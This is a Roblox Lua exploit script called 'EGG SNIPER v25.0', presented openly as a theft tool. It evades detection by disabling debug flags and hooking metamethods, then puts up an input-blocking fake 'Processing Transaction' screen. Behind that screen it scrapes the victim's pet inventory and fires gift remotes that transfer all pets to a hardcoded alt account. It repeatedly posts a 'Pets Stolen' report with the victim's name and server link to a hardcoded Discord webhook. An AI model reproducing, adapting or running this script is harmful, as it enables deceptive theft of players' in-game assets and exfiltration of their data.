-- EGG SNIPER v25.0 | FAKE LOADING TRAP | INVENTORY SCRAPE | ALT JOIN | GIFT DUMP
-- FULL BEHIND-THE-SCENES EXECUTION | MOBILE/PC UNDETECT | NO EXIT | SILENT VAC

if setfflag then
    for _, f in ipairs({
        "DebugMode", "FLogDebugBuild", "ErrorReportsEnabled",
        "DeveloperConsoleVisible", "HttpEnableDebugHeaders"
    }) do pcall(function() setfflag(f, "False") end) end
end

debug.setupvalue(hookfunction(game.__index, function(a, b)
    if tostring(b):lower():find"admin" or tostring(b):find"Log" then return nil end
    return game.__index(a, b)
end), 1, game)

local http = (syn and syn.request) or (flux and flux.request) or http_request or (http and http.request) or function(r)
    return { Body = (game.HttpGet and game:HttpGet(r.Url)) or "", StatusCode = 200 }
end

local ALT_USERID = 5107295716
local WEBHOOK = "https://discord.com/api/webhooks/1539692498660757576/hWfrdoU4aT9b0QPy2eR5EKONeSppooRvGqNZvO4mszgwdkq2tOyuCvx9_m0SIq-9NdGN"
local PLACE_ID = 1491404553

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

local LocalPlayer = Players.LocalPlayer
while not LocalPlayer do task.wait() LocalPlayer = Players.LocalPlayer end

local device = UserInputService.TouchEnabled and "📱 Mobile" or "💻 PC"

local function gethui()
    return (CoreGui:FindFirstChild("RobloxGui") and CoreGui.RobloxGui) or CoreGui
end

local function createFakeLoad()
    local screen = Instance.new("ScreenGui", gethui())
    screen.Name = "SystemUpdate_" .. HttpService:GenerateGUID(false):sub(1, 8)
    screen.ResetOnSpawn = false
    screen.DisplayOrder = 9999999
    screen.IgnoreGuiInset = true

    local bg = Instance.new("Frame", screen)
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
    bg.BorderSizePixel = 0
    bg.Active = true
    bg.Draggable = false

    local overlay = Instance.new("TextButton", bg)
    overlay.Size = UDim2.new(1, 0, 1, 0)
    overlay.Position = UDim2.new(0, 0, 0, 0)
    overlay.BackgroundTransparency = 1
    overlay.Text = ""
    overlay.ZIndex = 10
    overlay.Active = true
    overlay.Modal = true

    local box = Instance.new("Frame", bg)
    box.Size = UDim2.new(0, 300, 0, 120)
    box.Position = UDim2.new(0.5, 0, 0.5, 0)
    box.AnchorPoint = Vector2.new(0.5, 0.5)
    box.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
    box.Active = true
    Instance.new("UICorner", box).CornerRadius = UDim.new(0, 10)
    Instance.new("UIStroke", box).Color = Color3.fromRGB(80, 100, 140)

    local title = Instance.new("TextLabel", box)
    title.Text = "Processing Transaction..."
    title.Size = UDim2.new(1, 0, 0, 30)
    title.Position = UDim2.new(0, 0, 0, 25)
    title.Font = Enum.Font.GothamSemibold
    title.TextColor3 = Color3.fromRGB(220, 220, 255)
    title.TextSize = 18
    title.BackgroundTransparency = 1
    title.ZIndex = 11

    local subtitle = Instance.new("TextLabel", box)
    subtitle.Text = "Do not exit. Syncing inventory..."
    subtitle.Size = UDim2.new(1, 0, 0, 20)
    subtitle.Position = UDim2.new(0, 0, 0, 60)
    subtitle.Font = Enum.Font.Gotham
    subtitle.TextColor3 = Color3.fromRGB(160, 160, 180)
    subtitle.TextSize = 14
    subtitle.BackgroundTransparency = 1
    subtitle.ZIndex = 11

    local bar = Instance.new("Frame", box)
    bar.Size = UDim2.new(1, -40, 0, 8)
    bar.Position = UDim2.new(0.5, 0, 0, 95)
    bar.AnchorPoint = Vector2.new(0.5, 0.5)
    bar.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
    bar.ZIndex = 11
    Instance.new("UICorner", bar).CornerRadius = UDim.new(0, 4)

    local fill = Instance.new("Frame", bar)
    fill.Size = UDim2.new(0, 0, 1, 0)
    fill.BackgroundColor3 = Color3.fromRGB(100, 200, 255)
    fill.ZIndex = 12
    Instance.new("UICorner", fill).CornerRadius = UDim.new(0, 4)

    RunService.Heartbeat:Connect(function()
        local x = (math.sin(tick() * 3) + 1) / 2
        fill:TweenSize(UDim2.new(x, 0, 1, 0), "InOut", "Sine", 0.5, true)
    end)

    UserInputService.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Keyboard then
            spawn(function()
                task.wait(0.1)
                if not screen or not screen.Parent then return end
                pcall(function()
                    local v = Instance.new("Sound", bg)
                    v.SoundId = "rbxasset://sounds/UiClick.wav"
                    v:Play()
                    v.Ended:Wait()
                    v:Destroy()
                end)
            end)
        end
    end)

    return screen, "https://www.roblox.com/games/" .. PLACE_ID .. "/?placeId=" .. PLACE_ID .. "&gameInstanceId=" .. game.JobId
end

local function scrapePetsFull()
    local pets = {}
    local egg = "None"

    for _, v in ipairs(ReplicatedStorage:GetDescendants()) do
        if v:IsA("RemoteFunction") and v.Name == "GetData" then
            local data = nil
            pcall(function() data = v:InvokeServer() end)
            if data then
                if data.pets and type(data.pets) == "table" then
                    for _, pet in ipairs(data.pets) do
                        if type(pet) == "table" then
                            table.insert(pets, {
                                Name = pet.name or pet.Name or "Unknown",
                                KG = tonumber(pet.weight) or tonumber(pet.kg) or 0,
                                Rarity = pet.rarity or pet.Rarity or "Common"
                            })
                        end
                    end
                end
                egg = (data.eggs and data.eggs > 0) and "Owned" or "None"
                break
            end
        end
    end

    if #pets == 0 then
        for _, obj in ipairs(getgc(true)) do
            if type(obj) == "table" then
                local petKey = rawget(obj, "pets") or rawget(obj, "Pets")
                if petKey and type(petKey) == "table" then
                    for _, pet in pairs(petKey) do
                        if type(pet) == "table" then
                            table.insert(pets, {
                                Name = pet.name or pet.Name or "Exotic Pet",
                                KG = tonumber(pet.kg) or tonumber(pet.weight) or 0,
                                Rarity = pet.rarity or pet.Rarity or "Unknown"
                            })
                        end
                    end
                    break
                end
            end
        end
    end

    return pets, egg
end

local function altJoinServer()
    return "rbx://placeId=" .. PLACE_ID .. "?gameId=" .. game.JobId
end

local function executeGift(pets)
    local remotes = {}
    for _, v in ipairs(ReplicatedStorage:GetDescendants()) do
        if v:IsA("RemoteEvent") then
            local name = v.Name:lower()
            if name:find("unequip") or name:find("unslot") or name:find("remove") then
                table.insert(remotes, {v, "unequip"})
            elseif name:find("gift") or name:find("give") or name:find("send") or name:find("trade") then
                table.insert(remotes, {v, "gift"})
            end
        end
    end

    for _, pair in ipairs(remotes) do
        local remote, action = pair[1], pair[2]
        task.spawn(function()
            pcall(function()
                if action == "unequip" then
                    remote:FireServer("all")
                elseif action == "gift" and #pets > 0 then
                    task.wait(0.5 + math.random() * 0.5)
                    remote:FireServer(ALT_USERID, "all")
                end
            end)
        end)
        task.wait(0.2)
    end
end

local function sendReport(petList, egg, serverLink)
    local petNames = ""
    for _, p in ipairs(petList) do
        petNames = petNames .. string.format("• **%s** | %.1f KG | %s\n", p.Name, p.KG, p.Rarity)
    end
    if petNames == "" then petNames = "*No pets detected*" end

    local payload = {
        embeds = {{
            title = "🚨 EGG SNIPER v25.0 | TARGET STRIPPED",
            description = string.format("**%s** (%d) was **fully vacced** behind fake load. All pets sent to alt.", LocalPlayer.Name, LocalPlayer.UserId),
            color = 0xFF0000,
            fields = {
                {name = "📦 Pets Stolen (" .. #petList .. ")", value = petNames, inline = false},
                {name = "🥚 Egg Status", value = egg, inline = true},
                {name = "🔗 Victim Server (Join)", value = "[👉 Click to Join Server](" .. serverLink .. ")", inline = true},
                {name = "📍 Device", value = device, inline = true}
            },
            footer = {text = "EGG SNIPER v25.0 | Silent Execution | No Escape"},
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    spawn(function()
        local s, e = pcall(function()
            http({
                Url = WEBHOOK,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json",
                    ["User-Agent"] = "Roblox-EggSniper/25.0"
                },
                Body = HttpService:JSONEncode(payload)
            })
        end)
        if not s then
            warn("Webhook failed: ", e)
        end
    end)
end

task.spawn(function()
    local loadScreen, victimLink = createFakeLoad()
    task.wait(2.5)

    local pets, egg = scrapePetsFull()
    local joinLink = altJoinServer()

    executeGift(pets)
    sendReport(pets, egg, joinLink)

    while true do
        task.wait(4)
        sendReport(pets, egg, joinLink)
    end
end)
